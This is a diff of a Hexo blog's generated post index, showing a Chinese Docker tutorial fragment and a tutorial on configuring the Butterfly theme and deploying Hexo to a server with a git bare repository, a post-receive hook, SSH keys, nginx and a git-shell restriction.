-<h1 id="为了安全考虑-更改GIT用户的SHELL-权限"><a href="#为了安全考虑-更改GIT用户的SHELL-权限" class="headerlink" title="为了安全考虑,更改GIT用户的SHELL 权限"></a>为了安全考虑,更改GIT用户的SHELL 权限</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">which git-shell  #返回git-shell的安装目录，如：/usr/bin/git-shell</span><br><span class="line">cat /etc/shells	#如果文件不存在或没有/usr/bin/git-shell，则需要使用vim增加路径</span><br><span class="line">sudo vim /etc/shells</span><br></pre></td></tr></table></figure>
+docker exec：推荐大家使用 docker exec 命令，因为此退出容器终端，不会导致容器的停止。
 
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line">/bin/dash</span><br><span class="line">/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/tmux</span><br><span class="line">/usr/bin/screen</span><br><span class="line">/usr/bin/git-shell # 添加你的git-shell</span><br></pre></td></tr></table></figure>
+例如
+docker attach 4b6771050406
+docker exec -it b26d4f3e2cac /bin/bash
 
-<p><code>vim /etc/passwd</code></p>
-<p>找到类似<code>/home/git:/bin/bash</code></p>
-<p>更改<code>/bin/bash</code>修改为<code>/usr/bin/git-shell</code></p>
-<blockquote>
-<p>千万不要将root的<code>/bin/bash</code>修改，否则之后服务器就无法登录</p>
-</blockquote>
-<h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>配置挺难，但最后总算学到了什么。</p>
-<blockquote>
-<p>配置hexo到服务器的链接</p>
-</blockquote>
-<ul>
-<li><a href="http://roclinux.cn/?p=2551" target="_blank" rel="noopener">ssh相关</a></li>
-<li><a href="http://taqini.space/2020/02/12/start-with-hexo/#%E6%89%A7%E8%A1%8C%E9%83%A8%E7%BD%B2%E5%91%BD%E4%BB%A4-1" target="_blank" rel="noopener">博文一</a></li>
-<li><a href="https://www.laoyuyu.me/2017/10/10/hexo_deploy_vps/" target="_blank" rel="noopener">博文2</a></li>
-<li><a href="https://www.moonback.xyz/2019/10/19/hexo-deploy-aliyun/" target="_blank" rel="noopener">博文3</a></li>
-<li><a href="https://segmentfault.com/a/1190000005723321" target="_blank" rel="noopener">博文4</a></li>
-<li><a href="https://www.cnblogs.com/reblue520/p/6239733.html" target="_blank" rel="noopener">nginx 403错误</a></li>
-<li><a href="https://blog.csdn.net/qq_35843543/article/details/81561240" target="_blank" rel="noopener">nginx 403错误2</a></li>
-<li><a href="https://www.cnblogs.com/shuo1208/p/6702531.html" target="_blank" rel="noopener">nginx重装等命令</a></li>
-</ul>
-]]></content>
+删除容器使用 docker rm 命令：
+docker rm -f 1e560fca3906</code></pre><h2 id="docker-images-查看镜像"><a href="#docker-images-查看镜像" class="headerlink" title="docker images 查看镜像"></a>docker images 查看镜像</h2><pre><code>REPOSITORY：表示镜像的仓库源
+TAG：镜像的标签
+IMAGE ID：镜像ID
+CREATED：镜像创建时间
+SIZE：镜像大小</code></pre><p>我们可以从 Docker Hub 网站来搜索镜像</p>
+<p>面是一段简单的Dockerfile的例子：</p>
+<pre><code>FROM python:2.7
+MAINTAINER Angel_Kitty &lt;angelkitty6698@gmail.com&gt;
+COPY . /app
+WORKDIR /app
+RUN pip install -r requirements.txt
+EXPOSE 5000
+ENTRYPOINT [&quot;python&quot;]
+CMD [&quot;app.py&quot;]
+我们可以分析一下上面这个过程：
+
+1、从 Docker Hub 上 pull 下 python 2.7 的基础镜像
+2、显示维护者的信息
+3、copy 当前目录到容器中的 /app 目录下 复制本地主机的 &lt;src&gt; ( Dockerfile 所在目录的相对路径)到容器里 &lt;dest&gt;
+4、指定工作路径为 /app
+5、安装依赖包
+6、暴露 5000 端口
+7、启动 app
+这个例子是启动一个 python flask app 的 Dockerfile ( flask 是 python 的一个轻量的 web 框架)，相信大家从这个例子中能够稍微理解了Dockfile的组成以及指令的编写过程。</code></pre>]]></content>
       <categories>
-        <category>搭建博客</category>
+        <category>docker</category>
       </categories>
       <tags>
-        <tag>Butterfly</tag>
-        <tag>hexo</tag>
-        <tag>nginx</tag>
-        <tag>git</tag>
-        <tag>ssh</tag>
+        <tag>docker</tag>
       </tags>
   </entry>
   <entry>
@@ -888,6 +791,178 @@ sudo gedit pip.conf
 ]]></content>
       <tags>
         <tag>虚拟机配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo Butterfly主题配置及部署到服务器</title>
+    <url>/2020/04/06/hexo%E4%B8%BB%E9%A2%98%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h1 id="安装Butterfly主题与配置"><a href="#安装Butterfly主题与配置" class="headerlink" title="安装Butterfly主题与配置"></a>安装Butterfly主题与配置</h1><figure class="highlight"><table><tr><td class="code"><pre><span class="line">这个主题还是很不错的，我花了一个多礼拜的时间来搞。</span><br><span class="line">说明：我安装的是2.0.0版本的，因为以上版本我本地'hexo g'会出错</span><br></pre></td></tr></table></figure>
+
+<h2 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h2><p><a href="https://github.com/jerryc127/hexo-theme-butterfly/releases" target="_blank" rel="noopener">资源链接</a> </p>
+<p>直接点击下载比git clone要快的多，下载后解压到<code>hexo themes</code>目录下</p>
+<blockquote>
+<p>我主要将一些问题，配置说一下，要具体配置看<strong>相关博文链接</strong></p>
+</blockquote>
+<h2 id="hexo各目录作用"><a href="#hexo各目录作用" class="headerlink" title="hexo各目录作用"></a>hexo各目录作用</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml      <span class="comment">// 站点配置文件</span></span><br><span class="line">├── db.json          <span class="comment">// 缓存文件</span></span><br><span class="line">├── node_modules     <span class="comment">// 安装的插件以及hexo所需的一些nodejs模块</span></span><br><span class="line">├── package.json     <span class="comment">// 项目的依赖文件</span></span><br><span class="line">├── scaffolds        <span class="comment">// 模版文件	</span></span><br><span class="line">	-draft.md						</span><br><span class="line">	-page.md						</span><br><span class="line">	-post.md</span><br><span class="line">├── source           <span class="comment">// 源文件，用来存放你的文章 md 文件</span></span><br><span class="line">	-_posts</span><br><span class="line">└── themes           <span class="comment">// 主题文件</span></span><br></pre></td></tr></table></figure>
+
+<p>hexo new <file> 默认是post.md，一般放在source中<code>_posts</code>目录，我们写作的博客都在这里。</file></p>
+<p>​    可以在<code>post.md</code>中设置自动生成的博客的格式</p>
+<p>主题下载到themes目录下</p>
+<h2 id="主题目录"><a href="#主题目录" class="headerlink" title="主题目录"></a>主题目录</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── LICENSE</span><br><span class="line">├── README.en.md       <span class="comment">// READEME 英文版</span></span><br><span class="line">├── README.md          <span class="comment">// READEME 中文文件</span></span><br><span class="line">├── _config.yml        <span class="comment">// 主题配置文件</span></span><br><span class="line">├── languages         <span class="comment">// 多语言配置文件 可以在hexo的_config.yml中配置</span></span><br><span class="line">├── layout            <span class="comment">// 模板文件</span></span><br><span class="line">├── package.json      <span class="comment">// 项目的依赖文件</span></span><br><span class="line">├── scripts           <span class="comment">// 主题的脚本文件</span></span><br><span class="line">├── source            <span class="comment">// 主题的资源文件 CSS IMG</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Hexo-的工作原理"><a href="#Hexo-的工作原理" class="headerlink" title="Hexo 的工作原理"></a>Hexo 的工作原理</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo g：</span><br><span class="line">    生成静态文件。</span><br><span class="line">    将我们的数据和界面相结合生成静态文件的过程。</span><br><span class="line">    会遍历主题文件中的 source 文件夹（js、css、img 等静态资源），然后建立索引，然后根据索引生成 pubild 文件夹中，此时的 <span class="keyword">public</span> 文件是由 html、 js、css、img 建立的纯静态文件可以通过 index.html 作为入口访问你的博客。</span><br><span class="line">hexo d：</span><br><span class="line">    部署文件。</span><br><span class="line">    部署主要是根据在 _config.yml 中配置的 git 仓库或者 coding 的地址，将 <span class="keyword">public</span> 文件上传至 github 或者 coding 中。</span><br><span class="line">    然后再根据上面的 github 提供的 pages 服务呈现出页面。当然你也可以直接将你生成的 <span class="keyword">public</span> 文件上传至你自己的服务器上。</span><br></pre></td></tr></table></figure>
+
+<p>hexo大概就是将本地的文件，经过加工生成html文件。最后可上传到github或服务器上进行访问</p>
+<h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><h3 id="菜单的配置"><a href="#菜单的配置" class="headerlink" title="菜单的配置"></a>菜单的配置</h3><p><img alt data-src="https://i.loli.net/2020/04/06/FEwlX7jhDmV4oAq.png" class="lazyload"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:前面是显示的菜单名称</span><br><span class="line">|| 后面写图标名称 菜单图标可在网址里找 https://fontawesome.com/?from=io </span><br><span class="line">列表下面那种是分级目录</span><br></pre></td></tr></table></figure>
+
+<h3 id="创建page-tag等"><a href="#创建page-tag等" class="headerlink" title="创建page tag等"></a>创建page tag等</h3><p>刚开始，标签，分类，友链等都是没有界面的，所以用到命令</p>
+<p> <code>hexo new page &#39;name&#39;</code></p>
+<p>在hexo主目录中输入命令，会在<code>source</code>下出现相应目录</p>
+<p><code>tags</code>的配置</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: 标签</span><br><span class="line">date: 2020-04-03 16:20:50</span><br><span class="line">type: "tags"</span><br><span class="line">top_img:</span><br></pre></td></tr></table></figure>
+
+<p>top_img可以设置对应菜单下的图片,可以用图床生成图片链接</p>
+<p><code>link</code>的配置</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: link</span><br><span class="line">date: 2020-04-05 17:34:13</span><br><span class="line">type: "link"</span><br><span class="line">top_img: https://i.loli.net/2020/04/05/hDjZveqHTd1LWsI.png</span><br></pre></td></tr></table></figure>
+
+<p><code>categories</code>的配置</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: 分类</span><br><span class="line">date: 2020-04-03 16:20:21</span><br><span class="line">type: "categories"</span><br><span class="line">top_img:</span><br></pre></td></tr></table></figure>
+
+<h3 id="友链的设置"><a href="#友链的设置" class="headerlink" title="友链的设置"></a>友链的设置</h3><p>在hexo的source目录生成 <code>_data</code>里面生成<code>link.yml</code>文件</p>
+<p>文件内容</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>:</span></span><br><span class="line">  class_name: 友情链接</span><br><span class="line">  link_list:</span><br><span class="line">    <span class="number">1</span>:</span><br><span class="line">      name: <span class="comment">#名称</span></span><br><span class="line">      link: <span class="comment">#博客链接</span></span><br><span class="line">      avatar: <span class="comment">#头像</span></span><br><span class="line">      descr: <span class="comment">#描述</span></span><br><span class="line">    <span class="number">2</span>:</span><br><span class="line">      name:</span><br><span class="line">      link: </span><br><span class="line">      avatar: </span><br><span class="line">      descr:</span><br></pre></td></tr></table></figure>
+
+<p>另外在主题的配置文件中Flink下设置自己的资料</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># 友情鏈接界面設置</span><br><span class="line">Flink:</span><br><span class="line">  headline: 友情链接</span><br><span class="line">  info_headline: 我的Blog资料</span><br><span class="line">  name: Blog 名字： zzl14</span><br><span class="line">  address: Blog 地址： https:<span class="comment">//www.zzl14.xyz/link/</span></span><br><span class="line">  avatar: Blog 主题： Butterfly</span><br><span class="line">  info: Blog 简介： 日常学习总结</span><br><span class="line">  comment: 交换友链,请留言</span><br></pre></td></tr></table></figure>
+
+<p>界面如下<img alt="QQ截图20200406151505.png" data-src="https://i.loli.net/2020/04/06/TsqmJpDIulwQeCF.png" class="lazyload"></p>
+<h3 id="文章的图片设置"><a href="#文章的图片设置" class="headerlink" title="文章的图片设置"></a>文章的图片设置</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">category: &#123;&#123; category &#125;&#125;</span><br><span class="line">tags:</span><br><span class="line">top_img: <span class="comment">#文章顶部图片路径</span></span><br><span class="line">cover: <span class="comment">#封面路径</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="搜索框的设置"><a href="#搜索框的设置" class="headerlink" title="搜索框的设置"></a>搜索框的设置</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true <span class="comment">#主题配置中设置为true,并在hexo主目录使用如下命令下载依赖，</span></span><br><span class="line">    </span><br><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>
+
+<p>具体配置过程可能艰辛，但是慢慢来。</p>
+<h1 id="相关博文链接"><a href="#相关博文链接" class="headerlink" title="相关博文链接"></a>相关博文链接</h1><p><a href="https://ciweigg2.github.io/2019/07/04/hexo-theme-butterfly-zhu-ti-an-zhuang-ya/#toc-heading-5" target="_blank" rel="noopener">详细博文1</a></p>
+<p><a href="http://www.c-hasel.cn/2019/12/01/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%BA%8C/#%E5%AF%BC%E8%88%AA%E8%8F%9C%E5%8D%95" target="_blank" rel="noopener">详细博文2</a></p>
+<p><a href="http://yearito.cn/posts/hexo-get-started.html" target="_blank" rel="noopener">系列博文</a></p>
+<h1 id="hexo部署到服务器"><a href="#hexo部署到服务器" class="headerlink" title="hexo部署到服务器"></a>hexo部署到服务器</h1><p>由于github仓库的访问速度可能较慢，可能有必要搭建到服务器上进行访问。</p>
+<p>但是之后感觉其实没有太大必要</p>
+<p>先放一幅原理图（<a href="https://www.jianshu.com/p/e1ccd49b4e5d" target="_blank" rel="noopener">别人博客</a>的）</p>
+<p><img alt data-src="https://i.loli.net/2020/04/06/GPlK9CujERi4mk3.png" class="lazyload"></p>
+<p>所以我们需要在服务器搭建git仓库，下载Nginx，通过hooks将仓库部署到网站</p>
+<p>大致思路是</p>
+<p>1.本地上传到服务器的git仓库</p>
+<p>2.通过git仓库的hooks（钩子）将文件放到服务器的网站根目录（自己设置）</p>
+<p>3.通过Nginx将网站根目录的内容在公网ip进行展示</p>
+<blockquote>
+<p>安装nginx</p>
+<p>创建git用户</p>
+</blockquote>
+<h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@ip		#登录服务器</span><br><span class="line"></span><br><span class="line">sudo apt-get install nginx	(有时要用到 sudo apt-get update)</span><br><span class="line"><span class="meta">	#</span><span class="bash"> 或者</span></span><br><span class="line">sudo apt-get install apache2</span><br></pre></td></tr></table></figure>
+
+<h2 id="新建git用户"><a href="#新建git用户" class="headerlink" title="新建git用户"></a>新建git用户</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo adduser git		#新建git用户，下面会输入</span><br></pre></td></tr></table></figure>
+
+<h3 id="建立服务器端git仓库"><a href="#建立服务器端git仓库" class="headerlink" title="建立服务器端git仓库"></a>建立服务器端git仓库</h3><blockquote>
+<p>可以在hexo bash上上传到仓库</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo mkdir /zzl   # 创建个人git目录</span><br><span class="line">$ cd /zzl</span><br><span class="line">$ sudo mkdir blog.git  # 创建仓库</span><br><span class="line">$ cd blog.git</span><br><span class="line">$ sudo git init --bare # 初始化仓库</span><br></pre></td></tr></table></figure>
+
+<h3 id="建立网站根目录"><a href="#建立网站根目录" class="headerlink" title="建立网站根目录"></a>建立网站根目录</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir -p /home/git/hexo</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="改目录权限"><a href="#改目录权限" class="headerlink" title="改目录权限"></a>改目录权限</h3><blockquote>
+<p>因为在hexo的配置文件中repo选项是通过git进行上传</p>
+<p>所以要把目录权限给到git，并将用户目录权限改为775，即允许git用户写入</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chown -R git:git /zzl /home/git/hexochmod -R git 775</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> chmod -R git 775</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="编辑hook函数"><a href="#编辑hook函数" class="headerlink" title="编辑hook函数"></a>编辑hook函数</h3><blockquote>
+<p>将上传到仓库的文件转到网站根目录</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /zzl/blog.git/hooks/post-receive</span></span><br></pre></td></tr></table></figure>
+
+<p>填入以下内容</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">git --work-tree=/home/git/hexo --git-dir=/zzl/blog.git checkout -f</span><br></pre></td></tr></table></figure>
+
+<h3 id="在本地hexo-bash测试"><a href="#在本地hexo-bash测试" class="headerlink" title="在本地hexo bash测试"></a>在本地hexo bash测试</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@your_server_ip:/zzl/blog.git</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如果提示你克隆了一个空仓库，代表成功</p>
+<p>但是每次都要输入密码才能上传</p>
+<p>这时候我们就要用到<code>rsa</code>加密进行身份验证，以后就不用输入密码</p>
+</blockquote>
+<h3 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /home/git  #进到git目录</span><br><span class="line">su git    //切换git用户</span><br><span class="line">mkdir /home/git/.ssh  </span><br><span class="line">vi /home/git/.ssh/authorized_keys	#输入公钥</span><br></pre></td></tr></table></figure>
+
+<p>在之前的hexo与github仓库绑定时应该已经生成过</p>
+<p>我们可以再生成一次用来查看密钥位置</p>
+<p><code>ssh-keygen -t rsa</code></p>
+<p>会发现目录下有<code>id_rsa.pub</code>即公钥</p>
+<p>将公钥内容输入<code>/home/git/.ssh/authorized_keys</code></p>
+<blockquote>
+<p>最后在hexo bash 输入一下命令，如果不再输入密码，即配置成功</p>
+</blockquote>
+<p><code>ssh git@ip</code></p>
+<h2 id="配置网站根目录"><a href="#配置网站根目录" class="headerlink" title="配置网站根目录"></a>配置网站根目录</h2><p><code>nginx -t //查看nginx配置文件位置</code></p>
+<ul>
+<li>ubuntu</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>centos</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/blog.conf</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<blockquote>
+<p>不同版本的nginx或系统，nginx的配置文件不一定相同</p>
+</blockquote>
+<p>如果文件中有以下内容，就找对了文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    listen [::]:80;</span><br><span class="line">    root /hexo/git/hexo; # 修改的地方,改为设置的网站根目录的路径</span><br><span class="line">    server_name laoyuyu.me www.laoyuyu.me;  # 如果需要改域名访问，修改server_name 为域名便可</span><br><span class="line">    location / &#123;</span><br><span class="line">            # First attempt to serve request as file, then</span><br><span class="line">            # as directory, then fall back to displaying a 404.</span><br><span class="line">            try_files $uri $uri/ =404;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="最后重启服务，让NGINX生效"><a href="#最后重启服务，让NGINX生效" class="headerlink" title="最后重启服务，让NGINX生效"></a>最后重启服务，让NGINX生效</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure>
+
+<p>此时访问自己的ip可能出现403的情况，可能是因为没有上传东西。</p>
+<p>编辑<code>hexo _config.yml</code>文件</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">type: git <span class="comment">#用户名</span></span><br><span class="line">repo: git@ip:/zzl/blog.git <span class="comment">#Git仓库地址，ip为公网ip :符号后为Git仓库服务器路径</span></span><br><span class="line">branch: master <span class="comment">#分支，由于我们只用Git进行发布，master即可。</span></span><br></pre></td></tr></table></figure>
+
+<p><code>hexo d</code>上传之后再访问ip就可以了</p>
+<p>最后说一下git用户的权限更改</p>
+<h1 id="为了安全考虑-更改GIT用户的SHELL-权限"><a href="#为了安全考虑-更改GIT用户的SHELL-权限" class="headerlink" title="为了安全考虑,更改GIT用户的SHELL 权限"></a>为了安全考虑,更改GIT用户的SHELL 权限</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">which git-shell  #返回git-shell的安装目录，如：/usr/bin/git-shell</span><br><span class="line">cat /etc/shells	#如果文件不存在或没有/usr/bin/git-shell，则需要使用vim增加路径</span><br><span class="line">sudo vim /etc/shells</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line">/bin/dash</span><br><span class="line">/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/tmux</span><br><span class="line">/usr/bin/screen</span><br><span class="line">/usr/bin/git-shell # 添加你的git-shell</span><br></pre></td></tr></table></figure>
+
+<p><code>vim /etc/passwd</code></p>
+<p>找到类似<code>/home/git:/bin/bash</code></p>
+<p>更改<code>/bin/bash</code>修改为<code>/usr/bin/git-shell</code></p>
+<blockquote>
+<p>千万不要将root的<code>/bin/bash</code>修改，否则之后服务器就无法登录</p>
+</blockquote>
+<h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>配置挺难，但最后总算学到了什么。</p>
+<blockquote>
+<p>配置hexo到服务器的链接</p>
+</blockquote>
+<ul>
+<li><a href="http://roclinux.cn/?p=2551" target="_blank" rel="noopener">ssh相关</a></li>
+<li><a href="http://taqini.space/2020/02/12/start-with-hexo/#%E6%89%A7%E8%A1%8C%E9%83%A8%E7%BD%B2%E5%91%BD%E4%BB%A4-1" target="_blank" rel="noopener">博文一</a></li>
+<li><a href="https://www.laoyuyu.me/2017/10/10/hexo_deploy_vps/" target="_blank" rel="noopener">博文2</a></li>
+<li><a href="https://www.moonback.xyz/2019/10/19/hexo-deploy-aliyun/" target="_blank" rel="noopener">博文3</a></li>
+<li><a href="https://segmentfault.com/a/1190000005723321" target="_blank" rel="noopener">博文4</a></li>
+<li><a href="https://www.cnblogs.com/reblue520/p/6239733.html" target="_blank" rel="noopener">nginx 403错误</a></li>
+<li><a href="https://blog.csdn.net/qq_35843543/article/details/81561240" target="_blank" rel="noopener">nginx 403错误2</a></li>
+<li><a href="https://www.cnblogs.com/shuo1208/p/6702531.html" target="_blank" rel="noopener">nginx重装等命令</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>搭建博客</category>
+      </categories>
+      <tags>
+        <tag>Butterfly</tag>
+        <tag>hexo</tag>
+        <tag>nginx</tag>
+        <tag>git</tag>
+        <tag>ssh</tag>
       </tags>
   </entry>
   <entry>
